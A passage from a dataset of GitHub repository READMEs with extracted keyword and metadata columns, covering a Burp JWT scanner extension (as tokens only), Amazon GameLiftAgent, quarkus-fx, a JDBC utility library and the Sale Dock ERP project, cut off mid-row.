'request', 'highlighted', 'jwt', 'request', 'extension', 'selected', 'jwt', 'case', 'identified', 'vulnerability', 'issue', 'generated', 'installation', 'download', 'latest', 'jar', 'file', 'release', 'extender', 'tab', 'installed', 'add', 'extension', 'detail', 'extension', 'type', 'java', 'select', 'file', 'select', 'downloaded', 'jar', 'manually', 'select', 'jwt', 'valid', 'request', 'build', 'using', 'maven', 'build', 'jar', 'file', 'dependency']","['jwt', 'request', 'select', 'extension', 'check']",0,0,0,"['burp', 'extension', 'description', 'check', 'feature', 'usage', 'automatically', 'detect', 'jwt', 'manually', 'select', 'jwt', 'installation', 'build']",9,"['jwt', 'burp', 'extension', 'description', 'check']",1,0.0,1.0,[maven-assembly-plugin],0.0,1.0,0.0,1765,13.947368421052632,5.090566037735849,['releases -> https://github.com/CompassSecurity/jwt-scanner/releases'],1
aws/amazon-gamelift-agent,main,"## GameLiftAgent
GameLiftAgent is a Java application that is used to launch game server processes on Amazon GameLift fleets.

This application registers a compute resource for an existing Amazon GameLift fleet using the RegisterCompute
API. The application also calls the GetComputeAuthToken API to fetch an authorization token for the compute resource,
using it to make a web socket connection to the Amazon GameLift service.

## Quick Start
### JDK Version
GameLiftAgent was built with Java 17 and will require (at least) this version to compile.
Check the java version.
```
java -version
```
If the java version is not showing Java 17, then you will have to install Java 17.

### Build the GameLiftAgent using Maven
The GameLiftAgent requires a minimum version of 3.2.5. for Maven to run.
Check your maven version with the command:
```
mvn -version
```

If the Maven version is less than version 3.2.5, you will have to update the Maven version to be at least version 3.2.5.

1. Navigate to the GameLiftAgent package root (directory including `pom.xml` file)
2. Execute the following to download dependencies, compile the project and generate a standalone jar using Maven:
```
mvn clean compile assembly:single
```
If this successfully compiles, then GameLiftAgent-1.0.jar will become available in the following path:

```
ls ./target/GameLiftAgent-1.0.jar
```

### Before running the application/jar
Make sure you have an active Anywhere fleet and an active compute for the fleet before running the JAR.
The LaunchPath for the Server Process should be the in the same location as a game build executable or
Realtime Servers script. Use the following commands to perform the setup:

1. Copy the GameLiftAgent-1.0.jar to the directory (Example: /local/game or C:\game\).
#### Linux
```
cp ./target/GameLiftAgent-1.0.jar /local/game
```

#### Powershell
```
Copy-Item -Path .\target\GameLiftAgent-1.0.jar -Destination C:\game\
```

2. Then move the game executable to the same directory (/local/game).
#### Linux
```
cp [GAME_EXECUTABLE] /local/game
```

#### Powershell
```
Copy-Item -Path [GAME_EXECUTABLE] -Destination C:\game\
```

3. Grant read and execute permissions to run the JAR and the game executable.
#### Linux
```
sudo chmod 755 /local/game/GameLiftAgent-1.0.jar
sudo chmod 755 /local/game/[GAME_EXECUTABLE]
```

### Run the application/jar
Use the following instructions to run the application:
1. The standalone jar will be located in `./target/` and can be launched with a command such as the following
(There are some example launch commands listed at the end):
```
java -jar ./target/GameLiftAgent-1.0.jar <Command Line Options>
```

### Command Line Options
1. `certificate-path` / `cp`
    1. Optional - path to TLS certificate on compute resource. The path and certificate are not validated by Amazon GameLift.
1. `compute-name` / `c`
    1. Required - A descriptive label that is associated with the compute resource registered to your fleet.
    1. May also be provided using environment variable `GAMELIFT_COMPUTE_NAME` instead of specifying as a command line option.
    1. For managed Amazon GameLift, this is set by Amazon GameLift to environment variable `GAMELIFT_COMPUTE_NAME`.  No command line option required.
1. `dns-name` / `dns`
    1. Optional - The DNS name of the compute resource. (this option is not yet available)
    1. This option is used with Amazon GameLift Anywhere fleets only. Either `dns-name` or `ip-address` is required.
1. `fleet-id` / `f`
    1. Required - A unique identifier for the GameLift fleet on which the compute resource will be registered.
    1. May also be provided via environment variable `GAMELIFT_FLEET_ID` instead of specifying as a command line option.
    1. For managed Amazon GameLift, this is set by Amazon GameLift to environment variable `GAMELIFT_FLEET_ID`. No command line option required.
1. `gamelift-endpoint-override` / `gleo`
    1. Optional - For internal testing purposes. Using this option will likely result in errors.
1. `gamelift-credentials` / `glc`
    1. Optional - The source of credentials, which are used by the Amazon GameLift client make the `RegisterCompute` and `GetComputeAuthToken` API calls.
    1. Options are as follows (default is `instance-profile`):
        1. `instance-profile` - Uses credentials from the IAM profile associated with the Amazon GameLift EC2 fleet instance.
        1. `container` - Uses credentials from an ECS container IAM profile.
        1. `environment-variable` - Uses temporary IAM role credentials exported to environment variables.
1. `game-session-log-bucket` / `gslb`
    1. Optional - The name of an Amazon S3 bucket in the AWS account to upload game session logs.
    1. Using this option requires Amazon GameLift fleets to specify an `InstanceRoleArn`. The IAM role must include `s3:PutObject` permission.
    1. Using this option results in `InstanceRoleArn` credentials being fetched and cached via the web socket `GetFleetRoleCredentials` route.
1. `ip-address` / `ip`
    1. Optional - The IP address of the compute resource.
    1. This option is used with Amazon GameLift Anywhere fleets only. Either `dns-name` or `ip-address` is required.
1. `location` / `loc`
    1. Optional -  The location where the compute resource resides.
    1. Required for Amazon GameLift Anywhere fleets. Must match the custom location registered on the fleet.
    1. For Amazon GameLift EC2 fleets, this option is set by Amazon GameLift to environment variable `GAMELIFT_REGION`. No command line option required.
1. `gamelift-agent-log-bucket` / `galb`
    1. Optional - The name of an Amazon S3 bucket in the AWS account to upload logs for GameLiftAgent.
    1. Using this option requires Amazon GameLift fleets to specify an `InstanceRoleArn`. The IAM role must include `s3:PutObject` permission.
    1. Using this option results in `InstanceRoleArn` credentials being fetched and cached via the web socket `GetFleetRoleCredentials` route.
1. `gamelift-agent-log-path` / `galp`
    1. Optional - The file path where GameLiftAgent logs are stored locally. During launch, parent directories are created as required for this path.
    1. Defaults are `/local/gameliftagent/logs` for Linux and `C:\\GameLiftAgent\\Logs\\` for Windows.
1. `region` / `r`
    1. Required - The AWS region used when creating GameLift fleets.
    1. May also be provided using environment variable `GAMELIFT_REGION` instead of specifying as a command line option.
    1. For managed Amazon GameLift, this is set by Amazon GameLift to environment variable `GAMELIFT_REGION`. No command line option required.
1. `runtime-configuration` / `rc`
    1. Optional - A static RuntimeConfiguration provided as inline JSON.
    1. For managed Amazon GameLift Fleets, RuntimeConfiguration should set when creating or updating an Amazon GameLift fleet. No command line option required.

### Example Launch Commands - Managed GameLift

#### Linux

```
java -jar /<path>/<to>/GameLiftAgent-1.0.jar \
  -c '<compute-name>' \
  -f '<fleet id>' \
  -loc 'custom-<custom location name>' \
  -r '<region name>' \
  -glc environment-variable \
  -gslb 'gameliftgamesessionlogS3bucketname' \
  -galb 'gameliftagentlogS3bucketname' \
  -galp '/local/gameliftagent/logs/'
```

#### Windows

```
java -jar C:\\path\\to\\GameLiftAgent-1.0.jar `
  -c '<compute-name>' \
  -f '<fleet id>' \
  -loc 'custom-<custom location name>' \
  -r '<region name>' \
  -glc environment-variable \
  -gslb 'gameliftgamesessionlogS3bucketname' `
  -galb 'gameliftagentlogS3bucketname' `
  -galp 'C:\\GameLiftAgent\\logs\\'
```

### Example Environment Variables - Managed GameLift
#### Linux
```
export GAMELIFT_FLEET_ID=fleet-<id>
export GAMELIFT_COMPUTE_NAME=gamelift-compute-name
export GAMELIFT_REGION=us-west-2
export GAMELIFT_LOCATION=custom-<custom location name>
``` 

#### Windows
```
set GAMELIFT_FLEET_ID=fleet-<id>
set GAMELIFT_COMPUTE_NAME=gamelift-compute-name
set GAMELIFT_REGION=us-west-2
set GAMELIFT_LOCATION=custom-<custom location name>
``` 

## Security

See [CONTRIBUTING](CONTRIBUTING.md#security-issue-notifications) for more information.


## License
This project is licensed under the Apache-2.0 License.",2,4,4,apache-2.0,10.0,"['gameliftagent', 'gameliftagent', 'java', 'application', 'used', 'launch', 'game', 'server', 'process', 'amazon', 'gamelift', 'fleet', 'application', 'register', 'compute', 'resource', 'existing', 'amazon', 'gamelift', 'fleet', 'using', 'registercompute', 'api', 'application', 'also', 'call', 'getcomputeauthtoken', 'api', 'fetch', 'authorization', 'token', 'compute', 'resource', 'using', 'make', 'web', 'socket', 'connection', 'amazon', 'gamelift', 'service', 'quick', 'start', 'jdk', 'version', 'gameliftagent', 'built', 'java', 'require', 'least', 'version', 'compile', 'check', 'java', 'version', 'java', 'version', 'showing', 'java', 'install', 'java', 'build', 'gameliftagent', 'using', 'maven', 'gameliftagent', 'requires', 'minimum', 'version', 'maven', 'run', 'check', 'maven', 'version', 'command', 'maven', 'version', 'less', 'version', 'update', 'maven', 'version', 'least', 'version', 'navigate', 'gameliftagent', 'package', 'root', 'directory', 'including', 'file', 'execute', 'following', 'download', 'dependency', 'compile', 'project', 'generate', 'standalone', 'jar', 'using', 'maven', 'successfully', 'compiles', 'become', 'available', 'following', 'path', 'running', 'make', 'sure', 'active', 'anywhere', 'fleet', 'active', 'compute', 'fleet', 'running', 'jar', 'launchpath', 'server', 'process', 'location', 'game', 'build', 'executable', 'realtime', 'server', 'script', 'use', 'following', 'command', 'perform', 'setup', 'copy', 'directory', 'example', 'c', 'linux', 'powershell', 'move', 'game', 'executable', 'directory', 'linux', 'powershell', 'grant', 'read', 'execute', 'permission', 'run', 'jar', 'game', 'executable', 'linux', 'run', 'use', 'following', 'instruction', 'run', 'application', 'standalone', 'jar', 'located', 'launched', 'command', 'following', 'example', 'launch', 'command', 'listed', 'end', 'command', 'line', 'option', 'optional', 'path', 'tl', 'certificate', 'compute', 'resource', 'path', 'certificate', 'validated', 'amazon', 'gamelift', 'required', 'descriptive', 'label', 'associated', 'compute', 'resource', 'registered', 'fleet', 'may', 'also', 'provided', 'using', 'environment', 'variable', 'instead', 'specifying', 'command', 'line', 'option', 'managed', 'amazon', 'gamelift', 'set', 'amazon', 'gamelift', 'environment', 'variable', 'command', 'line', 'option', 'required', 'optional', 'dns', 'name', 'compute', 'resource', 'option', 'yet', 'available', 'option', 'used', 'amazon', 'gamelift', 'anywhere', 'fleet', 'either', 'required', 'required', 'unique', 'identifier', 'gamelift', 'fleet', 'compute', 'resource', 'registered', 'may', 'also', 'provided', 'via', 'environment', 'variable', 'instead', 'specifying', 'command', 'line', 'option', 'managed', 'amazon', 'gamelift', 'set', 'amazon', 'gamelift', 'environment', 'variable', 'command', 'line', 'option', 'required', 'optional', 'internal', 'testing', 'purpose', 'using', 'option', 'likely', 'result', 'error', 'optional', 'source', 'credential', 'used', 'amazon', 'gamelift', 'client', 'make', 'api', 'call', 'option', 'follows', 'default', 'us', 'credential', 'iam', 'profile', 'associated', 'amazon', 'gamelift', 'fleet', 'instance', 'us', 'credential', 'ec', 'container', 'iam', 'profile', 'us', 'temporary', 'iam', 'role', 'credential', 'exported', 'environment', 'variable', 'optional', 'name', 'amazon', 'bucket', 'aws', 'account', 'upload', 'game', 'session', 'log', 'using', 'option', 'requires', 'amazon', 'gamelift', 'fleet', 'specify', 'iam', 'role', 'must', 'include', 'permission', 'using', 'option', 'result', 'credential', 'fetched', 'cached', 'via', 'web', 'socket', 'route', 'optional', 'ip', 'address', 'compute', 'resource', 'option', 'used', 'amazon', 'gamelift', 'anywhere', 'fleet', 'either', 'required', 'optional', 'location', 'compute', 'resource', 'resides', 'required', 'amazon', 'gamelift', 'anywhere', 'fleet', 'must', 'match', 'custom', 'location', 'registered', 'fleet', 'amazon', 'gamelift', 'fleet', 'option', 'set', 'amazon', 'gamelift', 'environment', 'variable', 'command', 'line', 'option', 'required', 'optional', 'name', 'amazon', 'bucket', 'aws', 'account', 'upload', 'log', 'gameliftagent', 'using', 'option', 'requires', 'amazon', 'gamelift', 'fleet', 'specify', 'iam', 'role', 'must', 'include', 'permission', 'using', 'option', 'result', 'credential', 'fetched', 'cached', 'via', 'web', 'socket', 'route', 'optional', 'file', 'path', 'gameliftagent', 'log', 'stored', 'locally', 'launch', 'parent', 'directory', 'created', 'required', 'path', 'default', 'linux', 'window', 'required', 'aws', 'region', 'used', 'creating', 'gamelift', 'fleet', 'may', 'also', 'provided', 'using', 'environment', 'variable', 'instead', 'specifying', 'command', 'line', 'option', 'managed', 'amazon', 'gamelift', 'set', 'amazon', 'gamelift', 'environment', 'variable', 'command', 'line', 'option', 'required', 'optional', 'static', 'runtimeconfiguration', 'provided', 'inline', 'json', 'managed', 'amazon', 'gamelift', 'fleet', 'runtimeconfiguration', 'set', 'creating', 'updating', 'amazon', 'gamelift', 'fleet', 'command', 'line', 'option', 'required', 'example', 'launch', 'command', 'managed', 'gamelift', 'linux', 'window', 'example', 'environment', 'variables', 'managed', 'gamelift', 'linux', 'window', 'security', 'see', 'contributing', 'information', 'license', 'project', 'licensed', 'license']","['gamelift', 'amazon', 'option', 'fleet', 'command']",4,0,0,"['gameliftagent', 'quick', 'start', 'jdk', 'version', 'build', 'gameliftagent', 'use', 'maven', 'before', 'run', 'linux', 'powershell', 'linux', 'powershell', 'linux', 'run', 'command', 'line', 'option', 'example', 'launch', 'command', 'manage', 'gamelift', 'linux', 'window', 'example', 'environment', 'variable', 'manage', 'gamelift', 'linux', 'window', 'security', 'license']",20,"['linux', 'gameliftagent', 'run', 'powershell', 'command']",14,324.0,1.0,"[maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-surefire-plugin]",0.0,1.0,0.0,8196,10.366071428571429,5.297157622739018,"['GAME_EXECUTABLE', 'GAME_EXECUTABLE', 'GAME_EXECUTABLE']",3
quarkiverse/quarkus-fx,main,"# quarkus-fx

[![Version](https://img.shields.io/maven-central/v/io.quarkiverse.fx/quarkus-fx-parent?logo=apache-maven&style=flat-square)](https://search.maven.org/artifact/io.quarkiverse.fx/quarkus-fx)

<!-- ALL-CONTRIBUTORS-BADGE:START - Do not remove or modify this section -->
[![All Contributors](https://img.shields.io/badge/all_contributors-4-orange.svg?style=flat-square)](#contributors-)
<!-- ALL-CONTRIBUTORS-BADGE:END -->
This Quarkus extension allows you to use JavaFX in your Quarkus application. \
It will allow component injection in FX Controllers and will allow you to use CDI events to register on primary stage creation.

Please refer to documentation available at https://docs.quarkiverse.io/quarkus-fx/dev/index.html

You will be able to register on primary stage creation event via such code example.
```java
public class QuarkusFxApp {

  @Inject
  FXMLLoader fxmlLoader;

  public void start(@Observes final FxPostStartupEvent event) {
    try {
      InputStream fxml = this.getClass().getResourceAsStream(""/app.fxml"");
      Parent fxmlParent = this.fxmlLoader.load(fxml);

      Stage stage = event.getPrimaryStage();
      
      Scene scene = new Scene(fxmlParent);
      stage.setScene(scene);
      stage.show();

    } catch (IOException e) {
      // Handle error
    }
  }
}
```
To load multiple FXML files, you can use :
```java
@Inject
Instance<FXMLLoader> fxmlLoader;
```

Also, setting the location is required by some use cases (use of relative paths in FXML)
```java
FXMLLoader loader = this.fxmlLoader.get();
// Set location for relative path resolution
loader.setLocation(xxx);
```

For some sample apps and usage, check the `samples/` directory.

## Contributors ✨

Thanks goes to these wonderful people ([emoji key](https://allcontributors.org/docs/en/emoji-key)):

<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->
<!-- prettier-ignore-start -->
<!-- markdownlint-disable -->
<table>
  <tbody>
    <tr>
      <td align=""center"" valign=""top"" width=""14.28%""><a href=""https://github.com/CodeSimcoe""><img src=""https://avatars.githubusercontent.com/u/110094118?v=4?s=100"" width=""100px;"" alt=""Clément de Tastes""/><br /><sub><b>Clément de Tastes</b></sub></a><br /><a href=""https://github.com/quarkiverse/quarkus-fx/commits?author=CodeSimcoe"" title=""Code"">💻</a> <a href=""#maintenance-CodeSimcoe"" title=""Maintenance"">🚧</a></td>
      <td align=""center"" valign=""top"" width=""14.28%""><a href=""https://github.com/ghazyami""><img src=""https://avatars.githubusercontent.com/u/7247810?v=4?s=100"" width=""100px;"" alt=""Ghazy Abdallah""/><br /><sub><b>Ghazy Abdallah</b></sub></a><br /><a href=""https://github.com/quarkiverse/quarkus-fx/commits?author=ghazyami"" title=""Code"">💻</a></td>
      <td align=""center"" valign=""top"" width=""14.28%""><a href=""http://www.jboss.org""><img src=""https://avatars.githubusercontent.com/u/332210?v=4?s=100"" width=""100px;"" alt=""Scott M Stark""/><br /><sub><b>Scott M Stark</b></sub></a><br /><a href=""https://github.com/quarkiverse/quarkus-fx/commits?author=starksm64"" title=""Code"">💻</a></td>
      <td align=""center"" valign=""top"" width=""14.28%""><a href=""https://fouad.io""><img src=""https://avatars.githubusercontent.com/u/1194488?v=4?s=100"" width=""100px;"" alt=""Fouad Almalki""/><br /><sub><b>Fouad Almalki</b></sub></a><br /><a href=""https://github.com/quarkiverse/quarkus-fx/commits?author=Eng-Fouad"" title=""Code"">💻</a></td>
    </tr>
  </tbody>
</table>

<!-- markdownlint-restore -->
<!-- prettier-ignore-end -->

<!-- ALL-CONTRIBUTORS-LIST:END -->

This project follows the [all-contributors](https://github.com/all-contributors/all-contributors) specification. Contributions of any kind welcome!
",4,5,2,apache-2.0,65.0,"['quarkus', 'extension', 'allows', 'use', 'javafx', 'quarkus', 'application', 'allow', 'component', 'injection', 'fx', 'controller', 'allow', 'use', 'cdi', 'event', 'register', 'primary', 'stage', 'creation', 'please', 'refer', 'documentation', 'available', 'http', 'able', 'register', 'primary', 'stage', 'creation', 'event', 'via', 'code', 'example', 'load', 'multiple', 'fxml', 'file', 'use', 'also', 'setting', 'location', 'required', 'use', 'case', 'use', 'relative', 'path', 'fxml', 'sample', 'apps', 'usage', 'check', 'directory', 'contributor', 'thanks', 'go', 'wonderful', 'people', 'emoji', 'key', 'project', 'follows', 'specification', 'contribution', 'kind', 'welcome']","['use', 'quarkus', 'allow', 'event', 'register']",1,2,0,['contributor'],2,['contributor'],3,8.0,9.0,"[io.quarkus:quarkus-config-doc-maven-plugin,io.quarkus:quarkus-extension-maven-plugin,io.quarkus:quarkus-maven-plugin,it.ozimov:yaml-properties-maven-plugin,maven-compiler-plugin,maven-failsafe-plugin,maven-resources-plugin,maven-surefire-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.asciidoctor:asciidoctor-maven-plugin]",0.0,8.0,1.0,3680,65.5,4.935114503816794,"['![Version -> https://img.shields.io/maven-central/v/io.quarkiverse.fx/quarkus-fx-parent?logo=apache-maven&style=flat-square', '![All Contributors -> https://img.shields.io/badge/all_contributors-4-orange.svg?style=flat-square', 'emoji key -> https://allcontributors.org/docs/en/emoji-key', 'all-contributors -> https://github.com/all-contributors/all-contributors']",4
bowbahdoe/jdbc,main,"# JDBC

Utilities for working with the raw JDBC api. 

Includes

* Utilities for reading data from `ResultSet`s
* An `UncheckedSQLException` for when throwing a `SQLException` is inconvenient, but might need to be recovered later.
* A `SettableParameter` interface, for when String Templates are re-previewed.

## Dependency Information

### Maven

```xml
<dependency>
    <groupId>dev.mccue</groupId>
    <artifactId>jdbc</artifactId>
    <version>2024.08.11</version>
</dependency>
```


### Gradle

```groovy
dependencies {
    implementation(""dev.mccue:jdbc:2024.08.11"")
}
```


## Usage

These examples use [sqlite](https://central.sonatype.com/artifact/org.xerial/sqlite-jdbc). 

<!--

### Select rows by id

Any variables injected into the template will be replaced with `?`s in the
SQL and will be set with `.setObject` on the returned `PreparedStatement`.

```java
import dev.mccue.jdbc.StatementPreparer;

void main() throws Exception {
    var db = new SQLiteDataSource();
    db.setUrl(""jdbc:sqlite:test.db"");

    var id = 1;
    try (var conn = db.getConnection()) {
        try (var stmt = StatementPreparer.of(conn).""""""
                SELECT *
                FROM widget
                WHERE id = \{id}
                """""") {
            var rs = stmt.executeQuery();
        }
    }
}
```

### Select rows by ids

List parameters are automatically expanded into `(?, ?, ?)` with
one question mark for each element in the list.

```java
import dev.mccue.jdbc.StatementPreparer;

void main() throws Exception {
    var db = new SQLiteDataSource();
    db.setUrl(""jdbc:sqlite:test.db"");

    var ids = List.of(1, 2, 3);
    try (var conn = db.getConnection()) {
        try (var stmt = StatementPreparer.of(conn).""""""
                SELECT *
                FROM widget
                WHERE id IN \{ids}
                """""") {
            var rs = stmt.executeQuery();
        }
    }
}
```

### Inject parameters with custom logic

To inject a parameter that needs to be set with something other than `setObject`,
you can make an instance of `SettableParameter`.

```java
import dev.mccue.jdbc.SettableParameter;
import dev.mccue.jdbc.StatementPreparer;

void main() throws Exception {
    var db = new SQLiteDataSource();
    db.setUrl(""jdbc:sqlite:test.db"");

    var name = ""bob"";
    try (var conn = db.getConnection()) {
        try (var stmt = StatementPreparer.of(conn).""""""
                SELECT *
                FROM widget
                WHERE name = \{SettableParameter.ofNString(name)}
                """"""){
            var rs = stmt.executeQuery();
        }
    }
}
```
-->

### Read nullable primitive types

`ResultSets` includes helpers for reading potentially null
primitive types from a `ResultSet`

```java
import dev.mccue.jdbc.ResultSets;

void main() throws Exception {
    var db = new SQLiteDataSource();
    db.setUrl(""jdbc:sqlite:test.db"");

    try (var conn = db.getConnection()) {
        try (var stmt = conn.prepareStatement(""""""
                SELECT number
                FROM widget
                LIMIT 1
                """""")) {
            var rs = stmt.executeQuery();

            // Methods exist for all primitives except char 
            // (which doesn't have a method on ResultSet)
            var number = ResultSets.getIntegerNullable(rs, ""number"");
        }
    }
}
```

### Read non-null primitive types

If you want to read a column that is primitive, but you assume
is not null, there are helpers which will throw a `SQLException`
early if that assumption is violated.

```java
import dev.mccue.jdbc.ResultSets;

void main() throws Exception {
    var db = new SQLiteDataSource();
    db.setUrl(""jdbc:sqlite:test.db"");

    try (var conn = db.getConnection()) {
        try (var stmt = conn.prepareStatement(""""""
                SELECT number
                FROM widget
                LIMIT 1
                """""")) {
            var rs = stmt.executeQuery();

            // Methods exist for all primitives except char 
            // (which doesn't have a method on ResultSet)
            var number = ResultSets.getIntegerNotNull(rs, ""number"");
        }
    }
}
```

### Read a row as a `Record`

Often when going through a `ResultSet` you will want to materialize a whole row.

```java
import dev.mccue.jdbc.ResultSets;

public record Widget(int number) {}

void main() throws Exception {
    var db = new SQLiteDataSource();
    db.setUrl(""jdbc:sqlite:test.db"");

    try (var conn = db.getConnection()) {
        try (var stmt = conn.prepareStatement(""""""
                SELECT number
                FROM widget
                LIMIT 1
                """""")) {
            var rs = stmt.executeQuery();
            var widget = ResultSets.getRecord(rs, Widget.class);

            System.out.println(widget);
        }
    }
}
```


### Read a row as a `Record` with customized mappings

If the name of a record component doesn't line up with what you want pulled from a
`ResultSet`, you can use the `@Column` annotation.

```java
import dev.mccue.jdbc.Column;
import dev.mccue.jdbc.ResultSets;

public record Widget(@Column(label = ""number"") int n) {
}

void main() throws Exception {
    var db = new SQLiteDataSource();
    db.setUrl(""jdbc:sqlite:test.db"");

    try (var conn = db.getConnection()) {
        try (var stmt = conn.prepareStatement(""""""
                SELECT number
                FROM widget
                LIMIT 1
                """""")) {
            var rs = stmt.executeQuery();
            var widget = ResultSets.getRecord(rs, Widget.class);

            System.out.println(widget);
        }
    }
}
```

<!--
### Read a row as a `Record`, customizing how a column is gotten from a `ResultSet`.

```java
import dev.mccue.jdbc.Column;
import dev.mccue.jdbc.DefaultRecordComponentGetter;
import dev.mccue.jdbc.ResultSets;

import java.lang.reflect.RecordComponent;
import java.sql.ResultSet;
import java.sql.SQLException;

public record Text(String contents) {}

public static final class CustomRecordComponentGetter 
        extends DefaultRecordComponentGetter {
    @Override
    protected Object getIndexedRecordComponent(
            ResultSet rs, 
            RecordComponent recordComponent, 
            int index
    ) throws SQLException {
        return new Text(rs.getString(index));
    }

    @Override
    protected Object getLabeledRecordComponent(
            ResultSet rs, 
            RecordComponent recordComponent, 
            String label
    ) throws SQLException {
        return new Text(rs.getString(label));
    }
}

public record Widget(
        @Column(label = ""number"") 
        int n,
        @Column(
                recordComponentGetter = CustomRecordComponentGetter.class
        )
        Text name) {
}

void main() throws Exception {
    var db = new SQLiteDataSource();
    db.setUrl(""jdbc:sqlite:test.db"");

    try (var conn = db.getConnection()) {
        try (var stmt = conn.prepareStatement(""""""
                SELECT number, name
                FROM widget
                LIMIT 1
                """""")) {
            var rs = stmt.executeQuery();
            var widget = ResultSets.getRecord(rs, Widget.class);

            System.out.println(widget);
        }
    }
}
```

-->",9,0,1,apache-2.0,0.0,"['jdbc', 'utility', 'working', 'raw', 'jdbc', 'api', 'includes', 'utility', 'reading', 'data', 'throwing', 'inconvenient', 'might', 'need', 'recovered', 'later', 'interface', 'string', 'template', 'dependency', 'information', 'maven', 'gradle', 'usage', 'example', 'use', 'sqlite', 'read', 'nullable', 'primitive', 'type', 'includes', 'helper', 'reading', 'potentially', 'null', 'primitive', 'type', 'read', 'primitive', 'type', 'want', 'read', 'column', 'primitive', 'assume', 'null', 'helper', 'throw', 'early', 'assumption', 'violated', 'read', 'row', 'often', 'going', 'want', 'materialize', 'whole', 'row', 'read', 'row', 'customized', 'mapping', 'name', 'record', 'component', 'line', 'want', 'pulled', 'use', 'annotation']","['read', 'primitive', 'type', 'want', 'row']",1,0,0,"['jdbc', 'dependency', 'information', 'maven', 'gradle', 'usage', 'select', 'row', 'id', 'select', 'row', 'id', 'inject', 'parameter', 'custom', 'logic', 'read', 'nullable', 'primitive', 'type', 'read', 'primitive', 'type', 'read', 'row', 'record', 'read', 'row', 'record', 'customized', 'mapping', 'read', 'row', 'record', 'customize', 'column', 'gotten', 'resultset']",13,"['row', 'read', 'record', 'select', 'id']",10,22.0,1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.jreleaser:jreleaser-maven-plugin]",0.0,1.0,0.0,7235,50.125,5.43142144638404,['sqlite -> https://central.sonatype.com/artifact/org.xerial/sqlite-jdbc'],1
hardingadonis/saledock,main,"# Sale Dock

[![build](https://github.com/hardingadonis/saledock/actions/workflows/build.yml/badge.svg)](https://github.com/hardingadonis/saledock/actions/workflows/build.yml)
[![publish](https://github.com/hardingadonis/saledock/actions/workflows/publish.yml/badge.svg)](https://github.com/hardingadonis/saledock/actions/workflows/publish.yml)
[![release](https://github.com/hardingadonis/saledock/actions/workflows/release.yml/badge.svg)](https://github.com/hardingadonis/saledock/actions/workflows/release.yml)
[![CodeFactor](https://www.codefactor.io/repository/github/hardingadonis/saledock/badge)](https://www.codefactor.io/repository/github/hardingadonis/saledock)
![GitHub contributors](https://img.shields.io/github/contributors/hardingadonis/saledock)
![GitHub top language](https://img.shields.io/github/languages/top/hardingadonis/saledock)
![GitHub repo size](https://img.shields.io/github/repo-size/hardingadonis/saledock)
![GitHub License](https://img.shields.io/github/license/hardingadonis/saledock)

> SWP391 project, ERP system, Sales module

## Requirements

- JDK 17
- MySQL 8.2.0
- Tomcat 10
- Maven 3+

## Database

<details>
  <summary>Database</summary>

  <div style=""margin-top: 20px"">
    <a href=""https://github.com/hardingadonis/saledock"">
      <img src=""database/database.svg""/>
    </a>
  </div>
</details>

## Development

- You need to install the requirements above.

#### 1. Clone `Sale Dock`:

```bash
git clone https://github.com/hardingadonis/saledock.git
```

#### 2. Open `Sale Dock`:

- You can open `Sale Dock` with your favorite IDE:
  - [IntelliJ IDEA](https://www.jetbrains.com/idea/)
  - [Eclipse](https://www.eclipse.org/)
  - [NetBeans](https://netbeans.apache.org/)

#### 3. Build `Sale Dock` with `Maven` (Optional):

```bash
cd saledock
mvn verify
```

## Deployment

- Open Installation Guide: [Installation Guide](docs/INSTALLATION_GUIDE.md)

## Contributors

<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->
<!-- prettier-ignore-start -->
<!-- markdownlint-disable -->
<table>
  <tbody>
    <tr>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/hardingadonis""><img src=""https://avatars.githubusercontent.com/u/34091632?v=4"" width=""100px;"" alt=""""/><br /><sub><b>Minh Vương</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/bakaqc""><img src=""https://avatars.githubusercontent.com/u/126387856?v=4"" width=""100px;"" alt=""""/><br /><sub><b>Đinh Quốc Chương</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/htnghia1423""><img src=""https://avatars.githubusercontent.com/u/137130942?v=4"" width=""100px;"" alt=""""/><br /><sub><b>Thunder</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/yuhtnguyen""><img src=""https://avatars.githubusercontent.com/u/137138731?v=4"" width=""100px;"" alt=""""/><br /><sub><b>Yuht</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/linhlm0210""><img src=""https://avatars.githubusercontent.com/u/147788973?v=4"" width=""100px;"" alt=""""/><br /><sub><b>linhlm0210</b></sub></a></td>
    </tr>
    <tr>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/thson58""><img src=""https://avatars.githubusercontent.com/u/152074875?v=4"" width=""100px;"" alt=""""/><br /><sub><b>Nguyen Son</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://allcontributors.org""><img src=""https://avatars.githubusercontent.com/u/46410174?v=4"" width=""100px;"" alt=""""/><br /><sub><b>All Contributors</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://imgbot.net""><img src=""https://avatars.githubusercontent.com/u/31427850?v=4"" width=""100px;"" alt=""""/><br /><sub><b>Imgbot</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://www.codefactor.io""><img src=""https://avatars.githubusercontent.com/u/13309880?v=4"" width=""100px;"" alt=""""/><br /><sub><b>Automated code reviews</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/AnkitaGhosh2000""><img src=""https://avatars.githubusercontent.com/u/152983487?v=4"" width=""100px;"" alt=""""/><br /><sub><b>AnkitaGhosh2000</b></sub></a></td>
	</tr>
	<tr>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/SaibalCts23""><img src=""https://avatars.githubusercontent.com/u/153187590?v=4"" width=""100px;"" alt=""""/><br /><sub><b>SaibalCts23</b></sub></a></td>
